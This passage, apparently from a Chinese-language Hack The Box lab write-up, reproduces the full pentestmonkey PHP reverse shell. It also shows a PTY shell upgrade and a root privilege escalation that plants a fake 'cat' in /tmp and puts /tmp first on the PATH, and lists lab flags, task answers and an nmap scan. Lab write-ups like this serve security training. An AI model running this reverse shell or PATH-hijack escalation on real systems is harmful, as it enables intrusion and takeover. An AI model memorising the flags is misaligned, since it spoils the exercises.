class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="hljs-comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="hljs-comment">// do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// In all other respects the GPL version 2 applies:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">// it under the terms of the GNU General Public License version 2 as</span><br><span class="hljs-comment">// published by the Free Software Foundation.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">// GNU General Public License for more details.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You should have received a copy of the GNU General Public License along</span><br><span class="hljs-comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="hljs-comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="hljs-comment">// you, then do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="hljs-comment">// me at pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Description</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="hljs-comment">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Limitations</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="hljs-comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="hljs-comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Usage</span><br><span class="hljs-comment">// -----</span><br><span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;  <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">1234</span>;       <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// Fork and have the parent process exit</span><br>        <span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>        &#125;<br><br>        <span class="hljs-comment">// Make the current process a session leader</span><br>        <span class="hljs-comment">// Will only succeed if we forked</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// Check for end of TCP connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Check for end of STDOUT</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br>        <span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br>        <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// If we can read from the TCP socket, send</span><br>        <span class="hljs-comment">// data to process&#x27;s STDIN</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>\n&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>把 IP 和 Port 改一下然后传上去，监听</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ su<br>su: must be <span class="hljs-built_in">run</span> <span class="hljs-keyword">from</span> a terminal<br></code></pre></td></tr></table></figure><p>必须要交互 shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -group bugtracker 2&gt;/dev/null<br><span class="hljs-built_in">ls</span> -al /usr/bin/bugtracker<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86e6e3cfb4b1f066.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Regardless of which <span class="hljs-keyword">user</span> <span class="hljs-title">starts</span> running the bugtracker executable, what&#x27;s <span class="hljs-keyword">user</span> <span class="hljs-title">privileges</span> will use to run?<br>:root<br></code></pre></td></tr></table></figure><h3 id="Task-9-4"><a href="#Task-9-4" class="headerlink" title="Task 9"></a>Task 9</h3><p><strong>SUID</strong> (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux&#x2F;Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件<strong>。简而言之用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID</strong>。</p><p>简而言之就是，在使用命令时给普通用户赋予所有者的权限，比如 root 权限</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What SUID stands for?<br>:Set owner <span class="hljs-keyword">User</span> <span class="hljs-title">ID</span><br></code></pre></td></tr></table></figure><h3 id="Task-10-2"><a href="#Task-10-2" class="headerlink" title="Task 10"></a>Task 10</h3><p><img src="https://img.dkdun.cn/v1/2025/12/07eaaaf18ba81810.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> executable being called <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> insecure manner?<br>:cat<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-7"><a href="#Submit-Flag-7" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>蚁剑连接时查看 userflag</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:f2c74ee8db7983851ab2a96a44eb7981<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-8"><a href="#Submit-Flag-8" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>从前面已经发现 <code>bugtracker</code> 有 root 权限，并且我们能够调用 cat 命令，cat 命令是使用<strong>绝对路径</strong>来调用的，即在当前用户的环境变量指定的路径中查找 cat 命令，所以可以创建一个恶意的 cat 命令，并修改当前用户环境变量，将权限提升为 root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span>//将/tmp目录设置为环境变量<br><span class="hljs-built_in">cd</span> /tmp///切换到/tmp目录下<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span>//构造恶意的<span class="hljs-built_in">cat</span>命令<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>//赋予权限<br></code></pre></td></tr></table></figure><p><code>bugtracker</code> 调用 cat 命令时实际上调用的是 &#96;&#96;&#x2F;tmp&#96; 目录下的恶意的 cat 命令，此时 robert 用户临时具有了root 权限，uid 变成了root，但不是 root 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff0ea81990e4297c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:af13b0bee69f8a877c3faf667f7beacf<br></code></pre></td></tr></table></figure><h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><h3 id="Task-1-7"><a href="#Task-1-7" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sS</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-Pn</span> <span class="hljs-number">10.129</span><span class="hljs-selector-class">.69</span><span class="hljs-selector-class">.163</span><br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.94S</span><span class="hljs-selector-tag">VN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 00:23 CST</span><br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">69.163</span><br>Host is up (<span class="hljs-number">1.9s</span> latency).<br><span class="hljs-keyword">Not</span> <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br>| <span class="hljs-attribute">ftp-syst</span>:<br>|   <span class="hljs-attribute">STAT</span>:<br>| FTP server <span class="hljs-attribute">status</span>:<br>|      Connected <span class="hljs-attribute">to </span>::<span class="hljs-attribute">ffff</span>:<span class="hljs-number">10.10</span>.<span class="hljs-number">16.36</span><br>|      Logged in as ftpuser<br>|      <span class="hljs-attribute">TYPE</span>: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">1</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br>| <span class="hljs-attribute">ftp-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|_-rwxr-xr-x    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip<br><span class="hljs-number">22</span>/tcp open  ssh<br>| <span class="hljs-attribute">ssh-hostkey</span>:<br>|   <span class="hljs-number">3072</span> <span class="hljs-attribute">c0</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">b0</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-attribute">ac</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:<span class="hljs-attribute">d7</span>:<span class="hljs-attribute">a7</span>:<span class="hljs-number">41</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">81</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">51</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c3</span>:<span class="hljs-number">21</span>:<span class="hljs-attribute">df</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-attribute">a2</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c9</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">69</span>:<span class="hljs-attribute">d0</span>:<span class="hljs-number">28</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br>| <span class="hljs-attribute">http-cookie-flags</span>:<br>|   /:<br>|     <span class="hljs-attribute">PHPSESSID</span>:<br>|_      httponly flag <span class="hljs-keyword">not</span> set<br>|<span class="hljs-attribute">_http-title</span>: MegaCorp Login<br><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">97.70</span> seconds<br></code></pre></td></tr></table></figure><p>21 FTP、22 SSH、80 HTTP</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Besides SSH <span class="hljs-keyword">and</span> HTTP, what other service <span class="hljs-keyword">is</span> hosted <span class="hljs-keyword">on</span> <span class="hljs-keyword">this</span> box?<br>:FTP<br></code></pre></td></tr></table></figure><h3 id="Task-2-7"><a href="#Task-2-7" class="headerlink" title="Task 2"></a>Task 2</h3><p>FTP 的匿名登录</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">anonymous:</span>anonymous<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This service can be configured <span class="hljs-keyword">to</span> allow <span class="hljs-keyword">login</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> specific username. What <span class="hljs-keyword">is</span> that username?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-3-7"><a href="#Task-3-7" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 